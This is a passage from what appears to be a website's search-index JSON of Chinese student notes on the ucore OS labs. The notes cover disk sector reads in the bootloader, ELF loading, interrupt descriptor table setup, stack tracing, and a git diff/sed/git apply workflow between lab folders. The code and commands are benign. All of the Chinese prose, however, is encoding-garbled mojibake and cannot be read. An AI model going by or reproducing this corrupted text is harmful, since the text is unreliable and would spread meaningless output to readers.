è½½å™¨å­˜å‚¨åœ¨ç¬¬ä¸€ä¸ªæ‰‡åŒºï¼Œæ§åˆ¶æƒå°±è½¬ç§»åˆ°äº†è¿™ä¸ªæ–‡ä»¶ä¸­çš„ä»£ç ï¼ˆå…·ä½“æ˜¯åœ¨ bootasm.S è¿™ä¸ªæ–‡ä»¶ä¸­è°ƒç”¨çš„ bootmain() è¿™ä¸ªå‡½æ•°ï¼‰ï¼› å½“è¿™ä¸ªæ–‡ä»¶ä¸­çš„å‡½æ•°æ‰§è¡Œå®Œæ¯•ä¹‹åï¼Œå†…æ ¸ä¼šè¢«è¯»å…¥ï¼Œæ§åˆ¶æƒä¼šè¢«è½¬ç§»ç»™å†…æ ¸ã€‚  é—®é¢˜ä¸€ #   Boot loader å¦‚ä½•è¯»å–ç¡¬ç›˜æ‰‡åŒºçš„ï¼Ÿ\n æˆ‘ä»¬çœ‹æ–‡ä»¶ä¸­å‡½æ•° readsect çš„æ³¨é‡Šï¼Œå°±çŸ¥é“ç”¨æ¥è¯»å–ç¡¬ç›˜æ‰‡åŒºçš„æ˜¯è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬æ¥é€è¡Œè§£é‡Šè¿™ä¸ªå‡½æ•°ï¼š\n/* readsect - read a single sector at @secno into @dst */ static void readsect(void *dst, uint32_t secno) {  // wait for disk to be ready  waitdisk();   outb(0x1F2, 1); // count = 1  outb(0x1F3, secno \u0026amp; 0xFF);  outb(0x1F4, (secno \u0026gt;\u0026gt; 8) \u0026amp; 0xFF);  outb(0x1F5, (secno \u0026gt;\u0026gt; 16) \u0026amp; 0xFF);  outb(0x1F6, ((secno \u0026gt;\u0026gt; 24) \u0026amp; 0xF) | 0xE0);  outb(0x1F7, 0x20); // cmd 0x20 - read sectors   // wait for disk to be ready  waitdisk();   // read a sector  insl(0x1F0, dst, SECTSIZE / 4); }  çœ‹æ–‡ä»¶å‰çš„æ³¨é‡Šå¯çŸ¥ï¼Œå‡½æ•°ä¸¤ä¸ªå‚æ•°çš„å«ä¹‰ï¼šdst æ˜¯ç›®æ ‡å¥æŸ„ï¼Œsecno æ˜¯æ‰‡åŒºæ ‡ç¤ºï¼› æ ¹æ®å‚è€ƒèµ„æ–™ï¼Œåé¢çš„å‡ è¡Œæ˜¯é€šè¿‡ 24-bit LBA çš„æ–¹å¼è¯»å–ç£ç›˜ï¼ˆä¸‹é¢è¿›è¡Œè¯¦ç»†è§£æï¼‰ï¼› åé¢çš„ insl å‡½æ•°åˆ™æ˜¯è¯»å–å››ä¸ªå­—èŠ‚åˆ° dst è¿™ä¸ªå¥æŸ„ä¸­ï¼›  é‚£ä¹ˆ outb é‚£å‡ è¡Œçš„å…·ä½“åŸç†æ˜¯ä»€ä¹ˆå‘¢ï¼Œé¦–å…ˆæˆ‘ä»¬åœ¨ Linux manual ä¸Šæ‰¾åˆ°äº†å‡½æ•°åŸå‹ï¼š\nvoid outb(unsigned char value, unsigned short int port); å®ƒé€šè¿‡ port è¿™ä¸ª IO æŠ€æœ¯ä¸ç£ç›˜è¿›è¡Œé€šä¿¡ï¼Œè¿™ä¸ªæŠ€æœ¯è¢«ç®€ç§°ä¸º PIOã€‚å…³äºè¿™ä¸ªæŠ€æœ¯æˆ‘æ‰¾åˆ°ä¸€ä¸ªä¸­æ–‡çš„ç›¸å…³åšå®¢ï¼šç½‘ç»œ IO ä¸ç£ç›˜ IO è¯¦è§£ï¼Œå…¶ä¸­æ˜¯è¿™æ ·æè¿°çš„ï¼š\n PIOï¼šæˆ‘ä»¬æ‹¿ç£ç›˜æ¥è¯´ï¼Œå¾ˆæ—©ä»¥å‰ï¼Œç£ç›˜å’Œå†…å­˜ä¹‹é—´çš„æ•°æ®ä¼ è¾“æ˜¯éœ€è¦ CPU æ§åˆ¶çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬è¯»å–ç£ç›˜æ–‡ä»¶åˆ°å†…å­˜ä¸­ï¼Œæ•°æ®è¦ç»è¿‡ CPU å­˜å‚¨è½¬å‘ï¼Œè¿™ç§æ–¹å¼ç§°ä¸º PIOã€‚æ˜¾ç„¶è¿™ç§æ–¹å¼éå¸¸ä¸åˆç†ï¼Œéœ€è¦å ç”¨å¤§é‡çš„ CPU æ—¶é—´æ¥è¯»å–æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶è®¿é—®æ—¶ç³»ç»Ÿå‡ ä¹åœæ­¢å“åº”ã€‚ DMAï¼šåæ¥ï¼ŒDMAï¼ˆç›´æ¥å†…å­˜è®¿é—®ï¼ŒDirect Memory Accessï¼‰å–ä»£äº† PIOï¼Œå®ƒå¯ä»¥ä¸ç»è¿‡ CPU è€Œç›´æ¥è¿›è¡Œç£ç›˜å’Œå†…å­˜çš„æ•°æ®äº¤æ¢ã€‚åœ¨ DMA æ¨¡å¼ä¸‹ï¼ŒCPU åªéœ€è¦å‘ DMA æ§åˆ¶å™¨ä¸‹è¾¾æŒ‡ä»¤ï¼Œè®© DMA æ§åˆ¶å™¨æ¥å¤„ç†æ•°æ®çš„ä¼ é€å³å¯ï¼ŒDMA æ§åˆ¶å™¨é€šè¿‡ç³»ç»Ÿæ€»çº¿æ¥ä¼ è¾“æ•°æ®ï¼Œä¼ é€å®Œæ¯•å†é€šçŸ¥ CPUï¼Œè¿™æ ·å°±åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šé™ä½äº† CPUå æœ‰ç‡ï¼Œå¤§å¤§èŠ‚çœäº†ç³»ç»Ÿèµ„æºï¼Œè€Œå®ƒçš„ä¼ è¾“é€Ÿåº¦ä¸ PIO çš„å·®å¼‚å…¶å®å¹¶ä¸ååˆ†æ˜æ˜¾ï¼Œå› ä¸ºè¿™ä¸»è¦å–å†³äºæ…¢é€Ÿè®¾å¤‡çš„é€Ÿåº¦ã€‚ å¯ä»¥è‚¯å®šçš„æ˜¯ï¼ŒPIO æ¨¡å¼çš„è®¡ç®—æœºæˆ‘ä»¬ç°åœ¨å·²ç»å¾ˆå°‘è§åˆ°äº†ã€‚  åœ¨ Stanford çš„è¯¾ä»¶ä¸­ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº† 24-bit LBA æ¨¡å¼è¯»å–ç£ç›˜ï¼Œæœ‰æ›´å®Œæ•´æ³¨é‡Šçš„ä»£ç ï¼š\nIDE_ReadSector(int disk, int off, void *buf) { outb(0x1F6, disk == 0 ? 0xE0 : 0xF0); // Select Drive IDEWait(); outb(0x1F2, 512); // Read length (512 B) outb(0x1F3, off); // LBA Low outb(0x1F4, off \u0026gt;\u0026gt; 8); // LBA Mid outb(0x1F5, off \u0026gt;\u0026gt; 16); // LBA High outb(0x1F7, 0x20); // Read Command insw(0x1F0, buf, 256); // Read 256 Words } é—®é¢˜äºŒ #   Boot loader æ˜¯å¦‚ä½•åŠ è½½ ELF æ ¼å¼çš„ OSï¼Ÿ\n ç•¥è¯»ä»£ç å‘ç°ï¼Œè¯»å–å¹¶è§£æ ELF æ–‡ä»¶å­—èŠ‚çš„æ˜¯ bootmain å‡½æ•°åœ¨è¿›è¡Œçš„å·¥ä½œï¼š\n/* bootmain - the entry of bootloader */ void bootmain(void) {  // read the 1st page off disk  readseg((uintptr_t)ELFHDR, SECTSIZE * 8, 0);   // is this a valid ELF?  if (ELFHDR-\u0026gt;e_magic != ELF_MAGIC) {  goto bad;  }   struct proghdr *ph, *eph;   // load each program segment (ignores ph flags)  ph = (struct proghdr *)((uintptr_t)ELFHDR + ELFHDR-\u0026gt;e_phoff);  eph = ph + ELFHDR-\u0026gt;e_phnum;  for (; ph \u0026lt; eph; ph ++) {  readseg(ph-\u0026gt;p_va \u0026amp; 0xFFFFFF, ph-\u0026gt;p_memsz, ph-\u0026gt;p_offset);  }   // call the entry point from the ELF header  // note: does not return  ((void (*)(void))(ELFHDR-\u0026gt;e_entry \u0026amp; 0xFFFFFF))();  bad:  outw(0x8A00, 0x8A00);  outw(0x8A00, 0x8E00);   /* do nothing */  while (1); }  å®ƒé¦–å…ˆå°†ç£ç›˜çš„ç¬¬ä¸€é¡µè¯»å–äº†è¿›æ¥ï¼Œç„¶åé€šè¿‡æ–‡ä»¶å¹»æ•°æ£€æŸ¥å®ƒæ˜¯å¦ä¸ºä¸€ä¸ªåˆæ³•çš„ ELF æ–‡ä»¶ï¼› ç¨‹åºå¾ªç¯æ€§åœ°è°ƒç”¨ readseg å‡½æ•°ï¼Œé€šè¿‡ proghdr ç»“æ„çš„å‚æ•°è¯»å– ELF æ–‡ä»¶çš„å†…å®¹ï¼ˆæ­¤å¤„æ¶‰åŠåˆ° resadseg å‡½æ•°çš„å…·ä½“å®ç°ä¸ proghdr çš„ç»“æ„ï¼‰ï¼› ç„¶åç¨‹åºè°ƒç”¨ ELF çš„å…¥å£å‡½æ•°ï¼›  åœ¨ Stack Overflow ä¸Šå¯ä»¥æ‰¾åˆ°ç»“æ„çš„å…·ä½“å®ç°ï¼ˆæ²¡ä»€ä¹ˆç‰¹åˆ«çš„ï¼‰ï¼š\nstruct Proghdr {  uint32_t p_type;  uint32_t p_offset;  uint32_t p_va;  uint32_t p_pa;  uint32_t p_filesz;  uint32_t p_memsz;  uint32_t p_flags;  uint32_t p_align; }; è€Œ readseg å‡½æ•°å…·ä½“å®ç°å°±æ˜¯åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼š\n/* * * readseg - read @count bytes at @offset from kernel into virtual address @va, * might copy more than asked. * */ static void readseg(uintptr_t va, uint32_t count, uint32_t offset) {  uintptr_t end_va = va + count;   // round down to sector boundary  va -= offset % SECTSIZE;   // translate from bytes to sectors; kernel starts at sector 1  uint32_t secno = (offset / SECTSIZE) + 1;   // If this is too slow, we could read lots of sectors at a time.  // We\u0026#39;d write more to memory than asked, but it doesn\u0026#39;t matter --  // we load in increasing order.  for (; va \u0026lt; end_va; va += SECTSIZE, secno ++) {  readsect((void *)va, secno);  } } é€»è¾‘ä¹Ÿç›¸å½“æ¸…æ™°ï¼Œæ³¨é‡Šä¹Ÿå¾ˆå®Œæ•´ï¼Œè¿™é‡Œå°±ä¸è§£é‡Šäº†ã€‚\n"},{"id":292,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe5/","title":"Exe5","section":"lab1","content":"exe5 #  ç¨‹åºæ€è·¯ï¼šå‡½æ•°kern/debug/kdebug.c::print_stackframeçš„æ³¨é‡Šå†™çš„å¾ˆæ¸…æ¥šäº†ï¼Œå…ˆè°ƒç”¨read_ebp(),read_eip()è¯»å‡º ebp å’Œ eip çš„æŒ‡å¹¶æ‰“å°å‡ºæ¥ã€‚ç„¶åè¾“å‡ºå››ä¸ªå‚æ•°çš„å€¼ï¼Œç”± ebp å¼€å§‹å‘ä¸Šæ‰¾ä¸¤ä½æ‰€ä¿å­˜çš„å€¼æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä»¥æ­¤ç±»æ¨ã€‚ç„¶åæ‰¾åˆ°ä¸‹ä¸€ä¸ªå‡½æ•°æ ˆçš„ eip å’Œ ebp,ä¸‹ä¸€ä¸ªå‡½æ•°çš„ eip å°±æ˜¯å‹å…¥æ ˆçš„è¿”å›åœ°å€ï¼Œä¹Ÿå°±æ˜¯å½“å‰ ebp å‘ä¸Šæ‰¾ä¸€ä½æ‰€ä¿å­˜çš„å€¼ï¼Œä¸‹ä¸€ä¸ªå‡½æ•°çš„ ebp å°±æ˜¯å½“å‰ ebp ä¿å­˜çš„åœ°å€æ‰€æŒ‡å‘çš„åœ°æ–¹ã€‚\n"},{"id":293,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe6/","title":"Exe6","section":"lab1","content":"exe6 #  å†™åœ¨å‰é¢ï¼š #  é˜…è¯»æºç æ—¶ï¼Œå‘ç°äº†ä¸€ä¸ªä¹‹å‰æ²¡æœ‰é‡åˆ°è¿‡çš„ c è¯­è¨€è¯­æ³•ï¼š\nstruct struct_name {  unsigned field1: 16;  unsigned field2: 16; }; è¿™ä¸ªç»“æ„å£°æ˜è¡¨ç¤ºå£°æ˜äº†ä¸€ä¸ªåä¸º struct_nameï¼ŒåŒæ—¶æœ‰ field1ã€field2 è¿™ä¸¤ä¸ª 16 ä½å­—æ®µçš„ç»“æ„ã€‚ï¼ˆåŒæ—¶å‘ç° 64 ä½è®¡ç®—å™¨çš„ç»“æ„å¤§å°ä¸€å®šæ˜¯ 4 ä¸ªå­—èŠ‚çš„æ•´æ•°å€ï¼Œä¸è¶³åˆ™å‘ä¸Š paddingï¼‰\né—®é¢˜ä¸€ #   ä¸­æ–­æè¿°è¡¨ï¼ˆä¿æŠ¤æ¨¡å¼ä¸‹çš„ä¸­æ–­å‘é‡è¡¨ï¼‰ä¸­ï¼Œä¸€ä¸ªè¡¨é¡¹å å¤šå°‘ä¸ªå­—èŠ‚ï¼Ÿå…¶ä¸­å“ªå‡ ä½ä»£è¡¨ä¸­æ–­å¤„ç†ä»£ç çš„å…¥å£ï¼Ÿ\n ä¸­æ–­æè¿°è¡¨å®šä¹‰åœ¨ kern/trap/trap.c è¿™ä¸ªæ–‡ä»¶ä¸­ï¼š\n/* * * Interrupt descriptor table: * * Must be built at run time because shifted function addresses can\u0026#39;t * be represented in relocation records. * */ static struct gatedesc idt[256] = {{0}}; å…¶ä¸­ gatedesc è¿™ä¸ªç»“æ„å®šä¹‰åœ¨ kern/mm/mmu.h è¿™ä¸ªæ–‡ä»¶ä¸­ï¼š\n/* Gate descriptors for interrupts and traps */ struct gatedesc {  unsigned gd_off_15_0 : 16; // low 16 bits of offset in segment  unsigned gd_ss : 16; // segment selector  unsigned gd_args : 5; // # args, 0 for interrupt/trap gates  unsigned gd_rsv1 : 3; // reserved(should be zero I guess)  unsigned gd_type : 4; // type(STS_{TG,IG32,TG32})  unsigned gd_s : 1; // must be 0 (system)  unsigned gd_dpl : 2; // descriptor(meaning new) privilege level  unsigned gd_p : 1; // Present  unsigned gd_off_31_16 : 16; // high bits of offset in segment }; è®¡ç®—ä¹‹åå¯ä»¥å‘ç°è¿™ä¸ªç»“æ„ä¸€å…±å  64bits = 8bytesï¼Œä¹Ÿå°±æ˜¯è¯´è¡¨é¡¹å  8 ä¸ªå­—èŠ‚ã€‚\nå†³å®šå¤„ç†ä»£ç å…¥å£çš„æ˜¯é€»è¾‘åœ°å€ï¼Œä¹Ÿå°±æ˜¯æ®µé€‰æ‹©å­ä¸æ®µåç§»è¿™ä¸¤ä¸ªå­—ç«¯ï¼Œçœ‹åç§°ä¸æ³¨é‡ŠçŸ¥é“é€»è¾‘åœ°å€æ˜¯ gd_off_15_0ã€gd_ssã€gd_off_31_16 è¿™ä¸‰ä¸ªå­—æ®µå†³å®šçš„ã€‚ä¹Ÿå°±æ˜¯æœ€å¼€å§‹çš„ 32 ä½ä¸æœ€åçš„ 16 ä½ã€‚\né—®é¢˜äºŒ #   è¯·ç¼–ç¨‹å®Œå–„ kern/trap/trap.c ä¸­å¯¹ä¸­æ–­å‘é‡è¡¨è¿›è¡Œåˆå§‹åŒ–çš„å‡½æ•° idt_initã€‚åœ¨ idt_init å‡½æ•°ä¸­ï¼Œä¾æ¬¡å¯¹æ‰€æœ‰ä¸­æ–­å…¥å£è¿›è¡Œåˆå§‹åŒ–ã€‚ä½¿ç”¨ mmu.h ä¸­çš„ SETGATE å®ï¼Œå¡«å…… idt æ•°ç»„å†…å®¹ã€‚\næ¯ä¸ªä¸­æ–­çš„å…¥å£ç”± tools/vectors.c ç”Ÿæˆï¼Œä½¿ç”¨ trap.c ä¸­å£°æ˜çš„ vectors æ•°ç»„å³å¯ã€‚\n é¦–å…ˆæˆ‘ä»¬ç®€å•ç¿»è¯‘ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶çš„æ³¨é‡Šï¼š\n  æ‰€æœ‰çš„ ISR å…¥å£åœ°å€éƒ½å­˜å‚¨åœ¨ __vectors è¿™ä¸ªå˜é‡ä¸­ï¼Œè€Œè¿™ä¸ªå˜é‡æ˜¯ç”± tools/vector.c è¿™ä¸ªæ–‡ä»¶ç”Ÿæˆ kern/trap/vector.S è¿™ä¸ªæ±‡ç¼–ä»£ç å¾—æ¥çš„ã€‚\nä½ å¯ä»¥åœ¨ä»£ç ä¸­å¼•å…¥ä¸‹é¢è¿™ä¸€è¡Œæ¥å£°æ˜è¿™ä¸ªå¤–éƒ¨å˜é‡ï¼š\nextern uintptr_t __vectors[];   æ¥ä¸‹æ¥å°±å¯ä»¥ä½¿ç”¨ ISR çš„å…¥å£åˆå§‹åŒ– IDT äº†ï¼Œä¹Ÿå°±æ˜¯ kern/trap/trap.c æ–‡ä»¶ä¸­çš„ idt å˜é‡ï¼›\n  ä¹‹åï¼Œä½ å°±éœ€è¦ç”¨ lidt è¿™ä¸ªæŒ‡ä»¤å‘Šè¯‰ CPU ä¸­æ–­å‘é‡è¡¨çš„åœ°å€äº†ã€‚\n  ç¬¬äºŒæ­¥ä¸­ï¼Œè®¾ç½®éœ€è¦ç”¨åˆ° SETGATE è¿™ä¸ªå®ï¼š\n/* * * Set up a normal interrupt/trap gate descriptor * - istrap: 1 for a trap (= exception) gate, 0 for an interrupt gate * - sel: Code segment selector for interrupt/trap handler * - off: Offset in code segment for interrupt/trap handler * - dpl: Descriptor Privilege Level - the privilege level required * for software to invoke this interrupt/trap gate explicitly * using an int instruction. * */ #define SETGATE(gate, istrap, sel, off, dpl) { \\ (gate).gd_off_15_0 = (uint32_t)(off) \u0026amp; 0xffff; \\ (gate).gd_ss = (sel); \\ (gate).gd_args = 0; \\ (gate).gd_rsv1 = 0; \\ (gate).gd_type = (istrap) ? STS_TG32 : STS_IG32; \\ (gate).gd_s = 0; \\ (gate).gd_dpl = (dpl); \\ (gate).gd_p = 1; \\ (gate).gd_off_31_16 = (uint32_t)(off) \u0026gt;\u0026gt; 16; \\ } ç®€å•çš„è¯´å‘¢ï¼Œè¿™ä¸ªå®å®šä¹‰äº†äº”ä¸ªå‚æ•°ï¼š\n ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸­æ–­æè¿°ç¬¦ï¼Œå°±æ˜¯å‰ä¸€ä¸ªé—®é¢˜ä¸­ gatedesc è¿™ä¸ªç»“æ„çš„å¯¹è±¡ï¼› ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå¸ƒå°”å‹å˜é‡ï¼Œ1 è¡¨ç¤º Trap Gateï¼Œ0 è¡¨ç¤º Interrupt Gateï¼› ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æ®µé€‰æ‹©å­ï¼›ç¬¬å››ä¸ªå‚æ•°æ˜¯æ®µåç§»ã€‚è¿™ä¸¤ä¸ªå‚æ•°æ„æˆä¸€ä¸ªé€»è¾‘åœ°å€ï¼› ç¬¬äº”ä¸ªå‚æ•°æ˜¯æ®µæè¿°ç¬¦çš„ä¼˜å…ˆçº§ï¼›  æ®µé€‰æ‹©å­åº”è¯¥å¦‚ä½•é€‰æ‹©å‘¢ï¼Œåœ¨ kern/mm/memlayout.h è¿™ä¸ªæ–‡ä»¶ä¸­æœ‰æåˆ°ï¼š\n/* global descriptor numbers */ #define GD_KTEXT ((SEG_KTEXT) \u0026lt;\u0026lt; 3) // kernel text #define GD_KDATA ((SEG_KDATA) \u0026lt;\u0026lt; 3) // kernel data #define GD_UTEXT ((SEG_UTEXT) \u0026lt;\u0026lt; 3) // user text #define GD_UDATA ((SEG_UDATA) \u0026lt;\u0026lt; 3) // user data #define GD_TSS ((SEG_TSS) \u0026lt;\u0026lt; 3) // task segment selector ä¹Ÿå°±æ˜¯è¯´ï¼Œå†…æ ¸çš„ä»£ç æ®µæ˜¯ GD_KTEXT è¿™ä¸ªå®ã€‚\né—®é¢˜ä¸‰ #   è¯·ç¼–ç¨‹å®Œå–„ trap.c ä¸­çš„ä¸­æ–­å¤„ç†å‡½æ•° trapï¼Œåœ¨å¯¹æ—¶é’Ÿä¸­æ–­è¿›è¡Œå¤„ç†çš„éƒ¨åˆ†å¡«å†™ trap å‡½æ•°ä¸­å¤„ç†æ—¶é’Ÿä¸­æ–­çš„éƒ¨åˆ†ï¼Œä½¿æ“ä½œç³»ç»Ÿæ¯é‡åˆ° 100 æ¬¡æ—¶é’Ÿä¸­æ–­åï¼Œè°ƒç”¨ print_ticks å­ç¨‹åºï¼Œå‘å±å¹•ä¸Šæ‰“å°ä¸€è¡Œæ–‡å­— \u0026ldquo;100 ticksâ€ã€‚\n è¿™ä¸ªç›¸å½“ç®€å•ï¼Œæˆ‘å°±ä¸è¯´äº†ã€‚\n"},{"id":294,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/personal_summary/","title":"Personal Summary","section":"lab1","content":"@çŸ³åšï¼š\n é‡åˆ°çš„é¦–è¦é—®é¢˜å°±æ˜¯è¯»ä¸æ‡‚ linux å‘½ä»¤ä¸æ±‡ç¼–ï¼Œæ„Ÿè°¢ bing.comï¼Œä¸ºä»€ä¹ˆä¸æ„Ÿè°¢ google å‘¢ï¼Œå› ä¸ºæˆ‘ç¿»ä¸äº†å¢™å•Šï¼ŒæœåŠ¡å™¨å¤ªè´µäº†ç§Ÿä¸èµ·ã€‚ç„¶åå°±æ˜¯è¯»å‡ºæ¥çš„ ebp å’Œ eip å€¼æˆ‘å½“æˆäº†æŒ‡é’ˆï¼Œç›´æ¥å½“æŒ‡é’ˆä½¿ç”¨äº†ï¼ŒæŠ¥é”™å¾ˆæ¸…æ™°ï¼Œæ”¹å®Œç¨‹åºå°±okäº†ï¼Œå®Œç»“æ’’èŠ±ã€‚  @ä½˜å´§æ—ï¼š\n ç†Ÿæ‚‰äº†è§£äº†æ“ä½œç³»ç»Ÿçš„åº•å±‚ä¸­æ–­æœºåˆ¶ çŸ³åšç‰›é€¼  "},{"id":295,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab2/exe0/","title":"Exe0","section":"lab2","content":"exe0 #  æ¦‚è¿° #  é¦–å…ˆæˆ‘ä»¬çœ‹çœ‹ lab1 ä¸ lab2 çš„ä»£ç æœ‰ä»€ä¹ˆä¸åŒï¼š\n  åœ¨ ucore_os_lab è¿™ä¸ªé¡¹ç›®ä¸­æ·»åŠ ä¸åŒçš„ repoï¼Œç”¨ä»¥å›æ»šåˆ°æœ€åŸå§‹çš„ç‰ˆæœ¬ï¼š\n$ git remote -v origin\thttps://github.com/chyyuu/ucore_os_lab.git (fetch) origin\thttps://github.com/chyyuu/ucore_os_lab.git (push)  $ git remote add upstream https://github.com/chyyuu/ucore_os_lab  $ git remote -v origin\thttps://github.com/chyyuu/ucore_os_lab.git (fetch) origin\thttps://github.com/chyyuu/ucore_os_lab.git (push) upstream\thttps://github.com/chyyuu/ucore_os_lab (fetch) upstream\thttps://github.com/chyyuu/ucore_os_lab (push)   æ‹‰å–ä¸»ä»“ä¸­æœ€æ–°çš„ä»£ç ï¼Œå¹¶ä¸”åˆ‡æ¢åˆ°è¿œç¨‹çš„ master åˆ†æ”¯ï¼š\n$ git pull upstream master From https://github.com/chyyuu/ucore_os_lab  * branch master -\u0026gt; FETCH_HEAD  * [new branch] master -\u0026gt; upstream/master Already up to date.  $ git checkout upstream/master   ç„¶åæˆ‘ä»¬ä½¿ç”¨ diff å‘½ä»¤æŸ¥çœ‹ lab1 ä¸ lab2 çš„ä»£ç å·®å¼‚ï¼š\n$ diff -rq labcodes/lab1 labcodes/lab2 ... è¿™ä¸ªå‘½ä»¤æœ‰å¤§é‡çš„å›æ˜¾ï¼Œæ‰€ä»¥è¿™ä¸¤ä¸ªå­æ–‡ä»¶å¤¹æ˜¯ä¸ä¸€æ ·çš„ã€‚\n  è§£å†³æ–¹æ¡ˆ #  æˆ‘éœ€è¦æ»¡è¶³è¿™æ ·ä¸€äº›æ¡ä»¶çš„è§£å†³æ–¹æ¡ˆï¼š\n æ˜¾ç„¶æˆ‘ä»¬å¹¶ä¸æƒ³æ‰‹åŠ¨è¿›è¡Œæ›´æ”¹ï¼› æˆ‘ä»¬å¹¶ä¸æƒ³ä½¿ç”¨å›¾å½¢åŒ–å·¥å…·ï¼› æˆ‘ä»¬ä¹Ÿå¹¶ä¸æƒ³ï¼Œé€ä¸ªæ‰¾æˆ‘ä»¬æ›´æ”¹äº†å“ªäº›æ–‡ä»¶ï¼Œç„¶åé€šè¿‡æŸç§æ–¹å¼ â€œä¸€é”®æ›´æ”¹â€ï¼Œè¿™ç§è§£å†³æ–¹æ¡ˆè™½ç„¶æ¯”ç¬¬ä¸€ç§ç®€å•ä¸€äº›ï¼Œå¬èµ·æ¥ä»ç„¶å¾ˆæ„šè ¢ã€‚  æˆ‘ä»¬é¦–å…ˆæ˜ç™½æˆ‘ä»¬è¦åšçš„æ˜¯ä¸€ä»¶ä»€ä¹ˆæ ·çš„äº‹æƒ…ï¼Œæˆ‘ç”»äº†ä¸€ä¸ªæµç¨‹å›¾ï¼š\n +-------------+ +------------| lab1:legacy | | +------|------+ | | | | change1: fileA, fileB | | | | change2: fileC, fileD | | | | | | v v +-----------+ +-----------+ | lab2:HEAD | | lab1:HEAD | +-----|-----+ +-----|-----+ | | | merge | |\u0026lt;------------------+ | | change3: fileA, fileB, fileC, fileD | v +-------------+ | lab2:target | +-------------+ ç®€å•çš„è¯´ï¼Œæˆ‘ä»¬è¦åšçš„äº‹æƒ…æ˜¯é€šè¿‡ change1 ä¸ change2 å¾—åˆ° change3ã€‚\nå¦‚æœè¿™æ˜¯åˆ†æ”¯å¼€å‘ï¼Œé‚£äº‹æƒ…å°±ä¼šå¾ˆç®€å•ï¼Œç›´æ¥ä½¿ç”¨ git merge æˆ–è€… git stash push/apply å³å¯ã€‚ä½†æ˜¯æˆ‘ä»¬å·¥ä½œåœ¨ä¸¤ä¸ªä¸åŒçš„æ–‡ä»¶å¤¹ä¸‹ï¼Œæˆ‘ä»¬æœ‰ä»¥ä¸‹çš„æ€è·¯ï¼š\n é€šè¿‡ git diff å‘½ä»¤ï¼Œå°† chang2 å¯¼å‡ºï¼› é€šè¿‡ sed å‘½ä»¤ï¼Œå°† lab1 æ›¿æ¢ä¸º lab2 å¯¼å…¥åˆ°æ–‡ä»¶ä¸­ï¼› é€šè¿‡ git apply å‘½ä»¤å°†è¡¥ä¸æ–‡ä»¶ apply åˆ° lab2:HEAD ä¸Šã€‚  å®ç° #  æˆ‘ä»¬é¦–å…ˆæ‰¾åˆ°æœ¬ä»“åº“å¼•å…¥åŸå§‹ labcodes çš„ commitï¼šed036f7b95e0a968ea2e14537b7eecfc20291ce7ï¼š\n  å¯¼å‡º change2ï¼š\n$ git diff ed036f7b95e0a968ea2e14537b7eecfc20291ce7 HEAD labcodes/lab1/ | sed \u0026#39;s/lab1/lab2/g\u0026#39; \u0026gt; lab2/exe0.patch   è¿›è¡Œ mergeï¼š\n$ git apply lab2/exe0.patch   "},{"id":296,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab2/exe2/","title":"Exe2","section":"lab2","content":"exe2 #  æ¦‚è¿° #   é€šè¿‡è®¾ç½®é¡µè¡¨å’Œå¯¹åº”çš„é¡µè¡¨é¡¹ï¼Œå¯å»ºç«‹è™šæ‹Ÿå†…å­˜åœ°å€å’Œç‰©ç†å†…å­˜åœ°å€çš„å¯¹åº”å…³ç³»ã€‚å…¶ä¸­çš„ get_pte å‡½æ•°æ˜¯è®¾ç½®é¡µè¡¨é¡¹ç¯èŠ‚ä¸­çš„ä¸€ä¸ªé‡è¦æ­¥éª¤ã€‚æ­¤å‡½æ•°æ‰¾åˆ°ä¸€ä¸ªè™šåœ°å€å¯¹åº”çš„äºŒçº§é¡µè¡¨é¡¹ çš„å†…æ ¸è™šåœ°å€ï¼Œå¦‚æœæ­¤äºŒçº§é¡µè¡¨é¡¹ä¸å­˜åœ¨ï¼Œåˆ™åˆ†é…ä¸€ä¸ªåŒ…å«æ­¤é¡¹çš„äºŒçº§é¡µè¡¨ã€‚\næœ¬ç»ƒä¹ éœ€è¦è¡¥å…¨kern/mm/pmm.c æ–‡ä»¶ä¸­çš„ get_pte å‡½æ•°ï¼Œå®ç°å…¶åŠŸèƒ½ã€‚è¯·ä»”ç»†æŸ¥çœ‹å’Œç†è§£ get_pte å‡½æ•°ä¸­çš„æ³¨é‡Šã€‚\n å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š\npte_t *get_pte(pde_t *pgdir, uintptr_t la, bool create); æˆ‘ä»¬å…ˆæ¥ç¿»è¯‘ä¸€ä¸‹è¿™ä¸ªå‡½æ•°çš„æ³¨é‡Šï¼š\nå‡½æ•° get_pte çš„ç›¸å…³æ³¨é‡Šï¼š\n ä½œç”¨ï¼šé€šè¿‡é¡µç›®å½•é¡¹å’Œé€»è¾‘åœ°å€ï¼Œå–å¾—å¯¹åº”çš„é¡µè¡¨ï¼›å¦‚æœé¡µè¡¨ä¸å­˜åœ¨åˆ™ä¼šåˆ†é…è¿™ä¸ªé¡µè¡¨ï¼› 